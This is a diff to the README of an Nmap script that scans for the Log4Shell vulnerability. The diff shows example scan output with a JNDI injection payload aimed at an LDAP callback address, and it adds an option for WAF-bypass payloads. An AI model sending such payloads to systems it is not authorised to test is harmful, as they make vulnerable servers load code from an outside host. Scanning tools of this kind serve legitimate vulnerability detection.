@@ -31,7 +31,8 @@ Copy the provided script (log4shell.nse) into that directory run `nmap --script-
     PORT     STATE SERVICE
     8080/tcp open  http-proxy
     | log4shell: 
-    |   Payload: ${jndi:ldap:/172.17.42.1:389/log4shell}
+    |   Payloads:
+    |     ${jndi:ldap:/172.17.42.1:389/log4shell}
     |   Path: /
     |   Method: GET
     |   Headers: 
@@ -81,6 +82,7 @@ Copy the provided script (log4shell.nse) into that directory run `nmap --script-
 - `log4shell.http-headers`: Comma-separated list of HTTP headers (eg. `X-Api-Version,User-Agent,Referer`)
 - `log4shell.http-method`: HTTP method (default: `GET`)
 - `log4shell.url-path`: URL path (default: `/`)
+- `log4shell.waf-bypass`: Use WAF bypass payloads (default: `false`)
 
 
 ### Method A:
